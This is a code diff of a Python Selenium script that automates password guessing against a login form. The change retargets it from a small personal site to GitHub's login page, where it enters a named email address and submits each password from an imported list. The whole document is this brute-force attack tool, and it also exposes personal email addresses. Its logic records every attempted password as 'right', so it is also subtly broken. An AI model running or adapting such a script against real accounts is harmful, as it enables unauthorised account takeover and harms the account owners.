@@ -1,34 +1,36 @@
 from selenium import webdriver
 from selenium.webdriver.common.by import By
-from selenium.webdriver.common.by import By
-from selenium.webdriver.support.ui import WebDriverWait
-from selenium.webdriver.support import expected_conditions as EC
-
 import time
+from perm import listPass
+
+
 driver = webdriver.Chrome()
 
-driver.get('https://edozie-project.onrender.com/login/')
+driver.get('https://github.com/login')
 
-email_field = driver.find_element(By.ID, 'id_username')
+# with open('password.txt', 'r') as password_file:
+#     content = password_file.readlines()
+# password_list = []
+# for i in content:
+#     i = i.replace('\n', '')
+#     password_list.append(i)
+
+
+
+email_field = driver.find_element(By.ID, 'login_field')
 email_field.clear()
-email_field.send_keys('calebakpa@gmail.com')
+email_field.send_keys('ehirimchiedozie96@yahoo.com')
 
-correct_password = open('correct.txt', 'w')
+correct_password = open('right_password.txt', 'w')
 
-
-
-with open('passwords.txt', 'r') as saved:
-    content = saved.read()
-    password_list = content.split('\n')
-for item in password_list:
-    password_field = driver.find_element(By.ID, 'id_password')
+for password in listPass:
+    password_field = driver.find_element(By.CLASS_NAME, 'js-password-field')
     password_field.clear()
-    password_field.send_keys(item)
-    correct_password.write(item +'\n')
-
-    submit_field = driver.find_element(By.CLASS_NAME, 'btn-outline-info')
-
+    password_field.send_keys(password)
+    correct_password.write(password+'\n')
+    submit_field = driver.find_element(By.CLASS_NAME, 'btn-block')
     submit_field.click()
-    
+
+correct_password.close()
 
 time.sleep(1200)
